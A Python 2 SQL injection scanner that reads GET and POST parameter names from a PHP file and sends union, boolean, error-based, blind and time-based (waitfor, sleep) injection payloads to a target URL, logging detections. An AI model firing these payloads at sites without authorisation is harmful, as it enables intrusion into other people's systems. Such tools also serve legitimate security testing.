import httplib
import urllib, urllib2
import sys
import time

class SQL:
    def fileopen(self,path): #open php file and analyze parameters
        global postl
        postl = [] #post parameters list
        f = open(path,'r')
        get = [] #get parameters list
        while 1:
            line = f.readline()
            if not line: break
            p = line.find('$_GET') #find GET
            e=p
            param=''
            if p!=-1 : #if exist
                while 1: #find the first quote mark position
                    if(line[p]=='"'): break 
                    if(line[p]=="'"): break
                    p=p+1
                e=p+1 #after the first quote mark
                while 1: #find the second quote mark position
                    if(line[e]=='"'): break
                    if(line[e]=="'"): break
                    e=e+1
                param = line[p+1:e] #the name of parameter
                get.append(param) #append
            p = line.find('$_POST') #find POST
            e=p
            param=''
            if p!=-1 : #if exist
                while 1: #find the first quote mark position
                    if(line[p]=='"'): break
                    if(line[p]=="'"): break
                    p=p+1
                e=p+1
                while 1: #find the second quote mark position
                    if(line[e]=='"'): break
                    if(line[e]=="'"): break
                    e=e+1
                param = line[p+1:e] #the name of parameter
                postl.append(param) #append

        #remove duplicated entries
        get = list(set(get))
        postl = list(set(postl))
        extra = '?' #part of GET parameters added to url
        for i in range(len(get)):
            extra = extra + get[i] + '=1&' #set default value
        extra = extra[0:-1] #remove final &
        return extra #return
    def proc(self,url,path): #send payload
        f=open('sqlreport.txt','w') #report file
        gettest=1
        issp=1
        post = ''
        getp = url.find('?') #check if there is get parameters
        if getp==-1: #if doesn't exist
            f.write('There are no GET parameters. GET test will be skipped.\n')
            gettest=0
        if not postl: #check if there is post parameters
            issp=0
        else: post = postl[0] #if exists, take the first parameter
        if gettest==1: #if get parameters exist
            get = ''
            dest = url[0:getp] #url
            get = url[getp:] #get parameters
            data1 = ''
            payload = ' union select 1'
            for i in range(2,10): #number of union attributes
                getlist = get.split('=')
                payload += "," + str(i)
                req = urllib2.Request(dest+getlist[0]+'='+str(-3789)+urllib.quote(payload+" #")) #send payload
                response = urllib2.urlopen(req)
                data2 = response.read() #get response
                if data1!=data2 and i!=2: #if data is changed
                    f.write('Union SQL injection #' + str(i) + ' DETECT\n')
                    break
                data1=data2
            
            payload = ' and substring(version(),1,1)=' #mysql version check
            for i in range(2,10):
                req = urllib2.Request(dest+get+urllib.quote(payload+ str(i))) #send payload
                response = urllib2.urlopen(req)
                data2 = response.read() #get response
                if data1!=data2 and i!=2: #if data is changed as true or false
                    f.write('Boolean based SQL injection DETECT('+str(i)+')\n')
                    break
                data1=data2
            
            req = urllib2.Request(dest+get+urllib.quote(" having 1=1--")) #normal query
            response = urllib2.urlopen(req)
            data1 = response.read()
            req = urllib2.Request(dest+get+urllib.quote("' having 1=1--")) #error query
            response = urllib2.urlopen(req)
            data2 = response.read()
            if data1!=data2: #compare data
                f.write('Error based SQL injection DETECT\n')
            
            req = urllib2.Request(dest+get+urllib.quote(' and 1=1')) #true value check
            response = urllib2.urlopen(req)
            data1 = response.read()
            req = urllib2.Request(dest+get+urllib.quote(' and 1=0')) #false value check
            response = urllib2.urlopen(req)
            data2 = response.read()
            if data1!=data2: #if data changed
                f.write('Blind SQL injection DETECT\n') 
            

            t1=time.time()
            req = urllib2.Request(dest+get)#normal payload
            response = urllib2.urlopen(req)
            data1 = response.read()
            t2=time.time()
            interval1 = t2-t1 #time elapsed
            t1=time.time()
            req = urllib2.Request(dest+get+urllib.quote(";waitfor delay '00:00:01'")) #waitfor 1 second
            response = urllib2.urlopen(req)
            data2 = response.read()
            t2=time.time()
            interval2 = t2-t1

            if interval2-interval1>0.9: #time check
                f.write('Time based SQL injection DETECT\n')

        if issp==1:
            data1=''#same process for post
            for i in range(2,10):
                payload = post + '= and substring(version(),1,1)=' + str(i) #post payload
                req = urllib2.Request(url,payload)
                response = urllib2.urlopen(req)
                data2 = response.read()
                if len(data1)!=len(data2) and i!=2:
                    f.write('Boolean based SQL injection DETECT('+str(i)+')\n')
                    break
                data1 = data2
                
            payload = post + "=, sleep(5)" #sleep 5 seconds
            t1=time.time()
            req = urllib2.Request(url,payload)
            response = urllib2.urlopen(req)
            data1 = response.read()
            t2=time.time()

            if t2-t1>4.5: #time check
                f.write('Time based SQL injection DETECT')
                    

        print '\nDone'
